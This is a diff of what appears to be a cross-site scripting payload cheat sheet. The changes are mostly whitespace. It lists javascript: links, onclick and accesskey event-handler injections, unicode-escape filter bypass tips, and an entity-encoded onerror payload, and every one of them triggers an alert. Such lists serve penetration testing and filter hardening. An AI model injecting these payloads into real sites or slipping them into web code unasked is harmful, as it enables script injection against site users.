@@ -2,11 +2,11 @@
 
 Try to use this payloads :
 ```
-1) <a href="javascript:alert(1)"  >Click</a>
+1) <a href="javascript:alert(1)">Click</a>
 
 2) <a href="&#01;javascript:alert(1)">Click</a>
 
-3) <a src="google.com" onclick="alert(1)"  >Click</a>
+3) <a src="google.com" onclick="alert(1)">Click</a>
 ```
 Or try to replace " with \u0022, > with \u003e and < with \u003c. So the payload will be:
 ```
@@ -19,7 +19,7 @@ Try to event handlers :
 ```
 1) <input   value"XXXXXXX"   onclick=alert(1)  >Click</input>
 
-2) <input  type:"text" value="XSS"  accesskey="x" onclick="alert(1)" > <!--    If you cannot escape from the attribute (" is being encoded or deleted))
+2) <input  type:"text" value="XSS"  accesskey="x" onclick="alert(1)" >
 
 3) <img src=x  onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
 
